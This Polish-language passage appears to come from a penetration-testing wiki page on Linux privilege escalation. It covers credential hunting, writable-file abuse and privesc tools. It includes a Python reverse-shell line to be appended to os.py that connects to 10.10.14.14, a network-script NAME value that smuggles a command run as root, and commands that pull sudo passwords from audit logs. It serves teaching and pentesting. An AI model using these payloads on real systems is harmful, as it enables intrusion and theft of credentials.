find / -type f -iname ".*" -ls 2>/dev/null
```
### **Skrypty i binaria w PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Pliki webowe**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Kopie zapasowe**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Znane pliki zawierające passwords

Przeczytaj kod [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), on wyszukuje **kilka możliwych plików, które mogą zawierać passwords**.\
**Innym ciekawym narzędziem** które możesz użyć do tego jest: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) które jest otwartoźródłową aplikacją używaną do odzyskiwania wielu passwords przechowywanych na lokalnym komputerze dla Windows, Linux & Mac.

### Logs

Jeśli możesz czytać logs, możesz znaleźć w nich **interesujące/tajne informacje**. Im dziwniejsze logs, tym ciekawsze będą (prawdopodobnie).\
Ponadto niektóre "**bad**" skonfigurowane (backdoored?) **audit logs** mogą pozwolić Ci **zapisać passwords** w audit logs jak wyjaśniono w tym poście: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Aby **czytać logi, grupa** [**adm**](interesting-groups-linux-pe/index.html#adm-group) będzie naprawdę pomocna.

### Pliki Shell
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Powinieneś także sprawdzić pliki zawierające słowo "**password**" w ich **nazwie** lub w **zawartości**, a także sprawdzić IP i e-maile w logach, lub regexps dla hashy.\
Nie będę tu opisywał, jak to wszystko zrobić, ale jeśli jesteś zainteresowany, możesz sprawdzić ostatnie sprawdzenia, które wykonuje [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Pliki zapisywalne

### Python library hijacking

If you know from **where** a python script is going to be executed and you **can write inside** that folder or you can **modify python libraries**, you can modify the OS library and backdoor it (if you can write where python script is going to be executed, copy and paste the os.py library).

To **backdoor the library** just add at the end of the os.py library the following line (change IP and PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

Luka w `logrotate` pozwala użytkownikom z **uprawnieniami do zapisu** na pliku logu lub jego katalogach nadrzędnych potencjalnie uzyskać eskalację uprawnień. Dzieje się tak, ponieważ `logrotate`, często uruchamiany jako **root**, może być zmanipulowany do wykonania dowolnych plików, szczególnie w katalogach takich jak _**/etc/bash_completion.d/**_. Ważne jest sprawdzenie uprawnień nie tylko w _/var/log_, ale także w każdym katalogu, gdzie stosowana jest rotacja logów.

> [!TIP]
> Ta luka dotyczy `logrotate` w wersji `3.18.0` i starszych

Szczegółowe informacje o luce można znaleźć na tej stronie: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Możesz wykorzystać tę lukę przy pomocy [**logrotten**](https://github.com/whotwagner/logrotten).

Ta luka jest bardzo podobna do [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** więc zawsze gdy możesz zmieniać logi, sprawdź, kto nimi zarządza i czy możesz eskalować uprawnienia, zastępując logi symlinkami.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Odnośnik do luki:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Jeżeli, z jakiegokolwiek powodu, użytkownik jest w stanie **zapisać** skrypt `ifcf-<whatever>` do _/etc/sysconfig/network-scripts_ **lub** może **dostosować** istniejący, to your **system is pwned**.

Network scripts, _ifcg-eth0_ na przykład są używane do połączeń sieciowych. Wyglądają dokładnie jak pliki .INI. Jednak są ~sourced~ na Linux przez Network Manager (dispatcher.d).

W moim przypadku atrybut `NAME=` w tych skryptach sieciowych nie jest obsługiwany prawidłowo. Jeśli masz **spację w nazwie system próbuje wykonać część po spacji**. To oznacza, że **wszystko po pierwszej spacji jest wykonywane jako root**.

Na przykład: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Uwaga: pusty odstęp między Network a /bin/id_)

### **init, init.d, systemd i rc.d**

Katalog `/etc/init.d` zawiera **skrypty** dla System V init (SysVinit), **klasycznego systemu zarządzania usługami w Linuksie**. Zawiera skrypty do `start`, `stop`, `restart` i czasami `reload` usług. Mogą one być uruchamiane bezpośrednio lub przez dowiązania symboliczne znajdujące się w `/etc/rc?.d/`. Alternatywna ścieżka w systemach Redhat to `/etc/rc.d/init.d`.

Z kolei `/etc/init` jest związany z **Upstart**, nowszym systemem **zarządzania usługami** wprowadzonym przez Ubuntu, wykorzystującym pliki konfiguracyjne do zarządzania usługami. Pomimo przejścia na Upstart, skrypty SysVinit są nadal używane równolegle z konfiguracjami Upstart dzięki warstwie kompatybilności w Upstart.

**systemd** wyłania się jako nowoczesny system inicjalizacji i menedżer usług, oferując zaawansowane funkcje takie jak uruchamianie daemonów na żądanie, zarządzanie automountami oraz snapshoty stanu systemu. Organizuje pliki w `/usr/lib/systemd/` dla pakietów dystrybucyjnych oraz `/etc/systemd/system/` dla modyfikacji administratora, upraszczając administrację systemem.

## Inne sztuczki

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks często hookują syscall, aby udostępnić uprzywilejowaną funkcjonalność kernela do userspace managera. Słaba autentykacja managera (np. sprawdzenia sygnatury oparte na FD-order lub słabe schematy haseł) może umożliwić lokalnej aplikacji podszycie się pod managera i eskalację do root na urządzeniach już zrootowanych. Dowiedz się więcej i szczegóły eksploatacji tutaj:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## Mechanizmy zabezpieczeń jądra

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Więcej pomocy

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Najlepsze narzędzie do wyszukiwania lokalnych privilege escalation wektorów dla Linux:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Referencje

- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)


{{#include ../../banners/hacktricks-training.md}}
